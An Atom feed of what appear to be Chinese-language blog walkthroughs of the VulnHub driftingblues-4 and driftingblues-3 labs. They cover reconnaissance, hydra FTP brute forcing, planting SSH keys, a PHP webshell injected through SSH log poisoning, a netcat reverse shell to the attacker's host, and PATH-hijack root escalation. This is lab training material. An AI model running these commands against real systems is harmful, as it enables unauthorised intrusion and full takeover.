<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>MS02423</title>
  
  <subtitle>MS02423</subtitle>
  <link href="http://ms02423.top/atom.xml" rel="self"/>
  
  <link href="http://ms02423.top/"/>
  <updated>2024-02-19T10:44:41.318Z</updated>
  <id>http://ms02423.top/</id>
  
  <author>
    <name>MS02423</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>vulnhub靶场之driftingblues-4</title>
    <link href="http://ms02423.top/2024/02/19/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8Bdriftingblues-4/"/>
    <id>http://ms02423.top/2024/02/19/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8Bdriftingblues-4/</id>
    <published>2024-02-19T07:22:53.000Z</published>
    <updated>2024-02-19T10:44:41.318Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">get flagsdifficulty<span class="token punctuation">:</span> easyabout vm<span class="token punctuation">:</span> tested <span class="token operator">and</span> exported <span class="token keyword">from</span> virtualbox<span class="token punctuation">.</span> dhcp <span class="token operator">and</span> nested  vtx<span class="token operator">/</span>amdv enabled<span class="token punctuation">.</span> you can contact me <span class="token keyword">by</span> email <span class="token keyword">for</span> troubleshooting <span class="token operator">or</span>  questions<span class="token punctuation">.</span>This works better <span class="token keyword">with</span> VirtualBox rather <span class="token operator">than</span> VMware<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-靶场下载"><a href="#2-靶场下载" class="headerlink" title="2.靶场下载"></a>2.靶场下载</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>vulnhub<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token keyword">entry</span><span class="token operator">/</span>driftingblues-4<span class="token punctuation">,</span><span class="token number">661</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219153447919.png" alt="image-20240219153447919"></p><h2 id="3-靶场启动"><a href="#3-靶场启动" class="headerlink" title="3.靶场启动"></a>3.靶场启动</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219153529617.png" alt="image-20240219153529617"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">我们不知道靶场ip地址，但是我们知道网段是<span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span>，我们进行探测即可<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="二-信息收集"><a href="#二-信息收集" class="headerlink" title="二.信息收集"></a>二.信息收集</h1><h2 id="1-寻找靶场真实ip"><a href="#1-寻找靶场真实ip" class="headerlink" title="1.寻找靶场真实ip"></a>1.寻找靶场真实ip</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.1.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219153856132.png" alt="image-20240219153856132"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp-scan <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219153943877.png" alt="image-20240219153943877"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">靶场的ip地址为<span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.10</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="2.探测端口及服务"></a>2.探测端口及服务</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p- <span class="token parameter variable">-sV</span> <span class="token number">192.168</span>.1.10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219154231337.png" alt="image-20240219154231337"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">发现开启了21端口, 服务为ftp发现开启了22端口,服务为OpenSSH <span class="token number">7</span>.9p1 Debian <span class="token number">10</span>+deb10u2 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>发现开启了80端口，服务为Apache httpd <span class="token number">2.4</span>.38 <span class="token variable"><span class="token punctuation">((</span>Debian<span class="token punctuation">))</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="三-渗透测试"><a href="#三-渗透测试" class="headerlink" title="三.渗透测试"></a>三.渗透测试</h1><h2 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="1.访问web服务"></a>1.访问web服务</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219154558941.png" alt="image-20240219154558941"></p><p>我们查看页面，没有发现任何有用的信息，我们进行查看源代码，发现一串base64编码，我们一会进行解密查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219154703757.png" alt="image-20240219154703757"></p><p>开启了21端口，我们进行查看ftp服务，但是不能进行匿名访问</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ftp://192.168.1.10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219154817885.png" alt="image-20240219154817885"></p><h2 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="2.扫描web服务"></a>2.扫描web服务</h2><h3 id="1-nikto扫描"><a href="#1-nikto扫描" class="headerlink" title="1)nikto扫描"></a>1)nikto扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> http://192.168.1.10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219155004013.png" alt="image-20240219155004013"></p><p>没有任何信息</p><h3 id="2-dirsearch目录扫描"><a href="#2-dirsearch目录扫描" class="headerlink" title="2)dirsearch目录扫描"></a>2)dirsearch目录扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token number">192.168</span>.1.10 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219155336937.png" alt="image-20240219155336937"></p><p>什么也没有，目前我们掌握的信息，只有一串base64编码，我们进行解密查看</p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-解密"><a href="#1-解密" class="headerlink" title="1)解密"></a>1)解密</h3><p>我们进行解密base64,一共需要解密4次</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Z28gYmFjayBpbnRydWRlciEhISBkR2xuYUhRZ2MyVmpkWEpwZEhrZ1pISnBjSEJwYmlCaFUwSnZZak5DYkVsSWJIWmtVMlI1V2xOQ2FHSnBRbXhpV0VKellqTnNiRnBUUWsxTmJYZ3dWMjAxVjJGdFJYbGlTRlpoVFdwR2IxZHJUVEZOUjFaSlZWUXdQUT09<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219155604191.png" alt="image-20240219155604191"></p><p>我们发现是一个目录，我们进行访问</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.10/imfuckingmad.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219155717756.png" alt="image-20240219155717756"></p><p>发现是Brainfuck编码，我们进行解密，发现是一个二维码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219161522517.png" alt="image-20240219161522517"></p><h3 id="2-扫描二维码"><a href="#2-扫描二维码" class="headerlink" title="2)扫描二维码"></a>2)扫描二维码</h3><p>我们进行扫描</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219161542342.png" alt="image-20240219161542342"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219161616928.png" alt="image-20240219161616928"></p><p>我们发现一个网址，我们进行访问发现4个用户名</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://i.imgur.com/a4JjS76.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219164140157.png" alt="image-20240219164140157"></p><p>在之前我们访问ftp访问的时候，发现需要用户名进行登录，那么我们进行爆破试试</p><h3 id="3-hydra爆破"><a href="#3-hydra爆破" class="headerlink" title="3)hydra爆破"></a>3)hydra爆破</h3><p>我们使用hydra进行爆破</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra <span class="token parameter variable">-L</span> <span class="token string">'/home/kali/桌面/1.txt'</span>  <span class="token parameter variable">-P</span> /usr/share/wordlists/rockyou.txt ftp://192.168.1.10 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219172149703.png" alt="image-20240219172149703"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">破解出一个 FTP登录的用户名和密码：luther<span class="token operator">/</span>mypics<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219172351175.png" alt="image-20240219172351175"></p><p>是 sync（linux同步命令，含义为迫使缓冲块数据立即写盘并更新超级块），那我尝试往 ftp 中的 hubert 文件中写入 ssh 密钥，猜测应该就会同步到 hubert 用户的家目录中，现在 ftp 中的 hubert 目录下创建 .ssh 目录</p><h3 id="4-制作ssh私钥"><a href="#4-制作ssh私钥" class="headerlink" title="4)制作ssh私钥"></a>4)制作ssh私钥</h3><p>首先先在kaii本地生成秘钥ssh-keygen 将 id_rsa.pub SSH公钥文件另存为 authorized_keys</p><pre class="line-numbers language-none"><code class="language-none">ssh—keygen -t rsa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219174426188.png" alt="image-20240219174426188"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219174455466.png" alt="image-20240219174455466"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219180150587.png" alt="image-20240219180150587"></p><p>然后我们在hubert目录下创建.ssh目录，我之前就已经创建好了.ssh目录，所以这里就不在创建了</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219180336574.png" alt="image-20240219180336574"></p><p>我们上传authorized_keys到靶场里面，我们可以看到上传成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219180427738.png" alt="image-20240219180427738"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219180442341.png" alt="image-20240219180442341"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token number">400</span> id_rsa   <span class="token comment">#给权限</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="5-ssh登录"><a href="#5-ssh登录" class="headerlink" title="5)ssh登录"></a>5)ssh登录</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> hubert@192.168.1.10 <span class="token parameter variable">-i</span> id_rsa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219180801307.png" alt="image-20240219180801307"></p><p>我们可以在user.txt里面，看到第一个flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219180830325.png" alt="image-20240219180830325"></p><h3 id="6-提权"><a href="#6-提权" class="headerlink" title="6)提权"></a>6)提权</h3><p>我们使用命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219183651011.png" alt="image-20240219183651011"></p><p>我们可以看到熟悉的getinfo,我们进行提权</p><p>执行该程序，根据执行结果发现分别运行了ip addr、cat &#x2F;etc&#x2F;hosts、uname -a命令</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219183849451.png" alt="image-20240219183849451"></p><p>可以通过修改环境来进行命令劫持提权</p><p>通过修改环境变量让getinfo在调用命令调用到我们伪造的ip命令（在检索环境时会先调用最前面的环境也就是最新写入的环境），来达到提权的效果</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/tmp/:<span class="token environment constant">$PATH</span>             把/tmp路径写入到系统路径中<span class="token builtin class-name">cd</span> /tmp<span class="token builtin class-name">echo</span> <span class="token string">'/bin/bash'</span> <span class="token operator">></span> <span class="token function">ip</span>                       把/bin/bash写入到ip文件中<span class="token punctuation">(</span>相当于创建ip并写入/bin/bash<span class="token punctuation">)</span><span class="token function">chmod</span> +x <span class="token function">ip</span>                                    给ip文件增加执行权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219184404990.png" alt="image-20240219184404990"></p><p>我们可以看到是root提权，我们进行查看flag即可</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219184438188.png" alt="image-20240219184438188"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之driftingblues-3</title>
    <link href="http://ms02423.top/2024/02/06/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8Bdriftingblues-3/"/>
    <id>http://ms02423.top/2024/02/06/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8Bdriftingblues-3/</id>
    <published>2024-02-06T12:21:41.000Z</published>
    <updated>2024-02-06T14:34:59.452Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">get flagsdifficulty: easyabout vm: tested and exported from virtualbox. dhcp and nested  vtx/amdv enabled. you can contact me by email <span class="token keyword">for</span> troubleshooting or  questions.This works better with VirtualBox rather than VMware<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-靶场下载"><a href="#2-靶场下载" class="headerlink" title="2.靶场下载"></a>2.靶场下载</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://www.vulnhub.com/entry/driftingblues-3,656/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206202713671.png" alt="image-20240206202713671"></p><h2 id="3-靶场启动"><a href="#3-靶场启动" class="headerlink" title="3.靶场启动"></a>3.靶场启动</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206202740200.png" alt="image-20240206202740200"></p><p>靶场网段我们知道是192.168.1.0&#x2F;24,我们进行探测</p><h1 id="二-信息收集"><a href="#二-信息收集" class="headerlink" title="二.信息收集"></a>二.信息收集</h1><h2 id="1-寻找靶场真实ip"><a href="#1-寻找靶场真实ip" class="headerlink" title="1.寻找靶场真实ip"></a>1.寻找靶场真实ip</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.1.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206203023389.png" alt="image-20240206203023389"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp-scan <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206203110854.png" alt="image-20240206203110854"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">靶场真实ip地址为<span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.8</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="2.探测端口及服务"></a>2.探测端口及服务</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p- <span class="token parameter variable">-sV</span> <span class="token number">192.168</span>.1.8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206203247089.png" alt="image-20240206203247089"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现开启了<span class="token number">22</span>端口，服务为OpenSSH <span class="token number">7</span><span class="token punctuation">.</span>9p1 Debian <span class="token number">10</span><span class="token operator">+</span>deb10u2 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>发现开启了<span class="token number">80</span>端口，服务为Apache httpd <span class="token number">2.4</span><span class="token number">.38</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>Debian<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="三-渗透测试"><a href="#三-渗透测试" class="headerlink" title="三.渗透测试"></a>三.渗透测试</h1><h2 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="1.访问web服务"></a>1.访问web服务</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206203653556.png" alt="image-20240206203653556"></p><h2 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="2.扫描web服务"></a>2.扫描web服务</h2><h3 id="1-nikto扫描"><a href="#1-nikto扫描" class="headerlink" title="1)nikto扫描"></a>1)nikto扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> http://192.168.1.8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206203922196.png" alt="image-20240206203922196"></p><p>我们扫描到三个目录，一个一个进行访问</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206204008218.png" alt="image-20240206204008218"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206204031885.png" alt="image-20240206204031885"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206204049741.png" alt="image-20240206204049741"></p><p>发现只有robots.txt目录是有信息的，其他的都没有用</p><h3 id="2-dirsearch目录扫描"><a href="#2-dirsearch目录扫描" class="headerlink" title="2)dirsearch目录扫描"></a>2)dirsearch目录扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token number">192.168</span>.1.8 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206204405924.png" alt="image-20240206204405924"></p><p>还是只有robots.txt目录，那么我们进行分析即可</p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-访问robots-txt"><a href="#1-访问robots-txt" class="headerlink" title="1)访问robots.txt"></a>1)访问robots.txt</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.8/robots.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206204456418.png" alt="image-20240206204456418"></p><p>我们继续访问</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.8/eventadmins/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206204530574.png" alt="image-20240206204530574"></p><p>我们继续访问</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.8/littlequeenofspades.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206204608365.png" alt="image-20240206204608365"></p><p>我们访问源代码，可以看到一串base64编码，我们进行解密</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206204725055.png" alt="image-20240206204725055"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206204828018.png" alt="image-20240206204828018"></p><p>最后解密出来是一个目录，我们进行访问</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.1.8&#x2F;adminsfixit.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206204909039.png" alt="image-20240206204909039"></p><p>我们可以看到是ssh日志记录，那么我们可以试试一句话木马连接ssh，会不会被记录</p><h3 id="2-ssh日志记录"><a href="#2-ssh日志记录" class="headerlink" title="2)ssh日志记录"></a>2)ssh日志记录</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> <span class="token string">'&lt;?php @eval($_POST['</span>MS02423<span class="token string">']);?>'</span>@192.168.1.8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206205235001.png" alt="image-20240206205235001"></p><p>我们连接蚁剑，发现可以连接成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206210144181.png" alt="image-20240206210144181"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206210205634.png" alt="image-20240206210205634"></p><p>这样我们就可以反弹shell了</p><h3 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3)反弹shell"></a>3)反弹shell</h3><p>方法一:我们使用cmd进行反弹</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.8/adminsfixit.php/?cmd<span class="token operator">=</span>system<span class="token punctuation">(</span>%27nc%20-e%20/bin/bash%20192.168.1.9%205555%27<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206210921157.png" alt="image-20240206210921157"></p><p>我们可以看到反弹成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206210950397.png" alt="image-20240206210950397"></p><p>方法二:我们使用蚁剑虚拟终端进行反弹</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206211425460.png" alt="image-20240206211425460"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206211450472.png" alt="image-20240206211450472"></p><p>我们可以看到反弹成功，这两个方法都可以试试</p><h3 id="4-SSH密钥"><a href="#4-SSH密钥" class="headerlink" title="4)SSH密钥"></a>4)SSH密钥</h3><p>分析查看靶机内文件，发现home目录下有一个robertj用户，且该用户目录下存在两个文件，user.txt”文件没有权限无法打开，.ssh 目录有可读可写可执行权限，进入 .ssh 目录进行查看，发现目录内没有任何文件内容</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206212334888.png" alt="image-20240206212334888"></p><p>继续查看分析，查看ssh配置文件（默认目录&#x2F;etc&#x2F;ssh&#x2F;sshd_config），发现可以公钥登录，并且给出了公钥文件存放目录 &#x2F;home&#x2F;robertj&#x2F;.ssh&#x2F;authorized_keys</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206212709475.png" alt="image-20240206212709475"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206212849011.png" alt="image-20240206212849011"></p><p>尝试把公钥放入.ssh目录内，使用 ssh-keygen工具生成公密钥，并将生成的密钥保存到 &#x2F;home&#x2F;robertj&#x2F;.ssh&#x2F; 目录下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-keygen <span class="token parameter variable">-t</span> rsa<span class="token parameter variable">-t</span>    指定生成的密钥类型，默认为RSA类型<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206213858683.png" alt="image-20240206213858683"></p><p>我们可以看到写入成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206220853065.png" alt="image-20240206220853065"></p><p>将生成的公钥内容输出到authorized_keys文件内</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206221005812.png" alt="image-20240206221005812"></p><p>查看私钥文件，将内容复制出来，粘贴到本地文件中, 注意要将id_rsa文件的权限修改为与创建时权限一致</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206221124000.png" alt="image-20240206221124000"></p><h3 id="5-ssh登录"><a href="#5-ssh登录" class="headerlink" title="5)ssh登录"></a>5)ssh登录</h3><p>我们进行登录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> robertj@192.168.1.8 <span class="token parameter variable">-i</span> <span class="token string">'/home/kali/桌面/1.txt'</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206221327567.png" alt="image-20240206221327567"></p><p>我们查看user.txt，看到第一个flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206221416157.png" alt="image-20240206221416157"></p><h3 id="6-提权"><a href="#6-提权" class="headerlink" title="6)提权"></a>6)提权</h3><p>我们使用sudo -l查看，发现没有</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206221623865.png" alt="image-20240206221623865"></p><p>那么我们使用另一条命令，使用 find 命令寻找suid程序，发现一个可疑程序&#x2F;usr&#x2F;bin&#x2F;getinfo</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206221720045.png" alt="image-20240206221720045"></p><p>执行该程序，根据执行结果发现分别运行了ip addr、cat &#x2F;etc&#x2F;hosts、uname -a命令</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206221952961.png" alt="image-20240206221952961"></p><p>可以通过修改环境来进行命令劫持提权</p><p>通过修改环境变量让getinfo在调用命令调用到我们伪造的ip命令（在检索环境时会先调用最前面的环境也就是最新写入的环境），来达到提权的效果</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/tmp/:<span class="token environment constant">$PATH</span>             把/tmp路径写入到系统路径中<span class="token builtin class-name">cd</span> /tmp<span class="token builtin class-name">echo</span> <span class="token string">'/bin/bash'</span> <span class="token operator">></span> <span class="token function">ip</span>                       把/bin/bash写入到ip文件中<span class="token punctuation">(</span>相当于创建ip并写入/bin/bash<span class="token punctuation">)</span><span class="token function">chmod</span> +x <span class="token function">ip</span>                                    给ip文件增加执行权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206222242713.png" alt="image-20240206222242713"></p><p>我们查看flag即可</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206222331559.png" alt="image-20240206222331559"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之driftingblues-2</title>
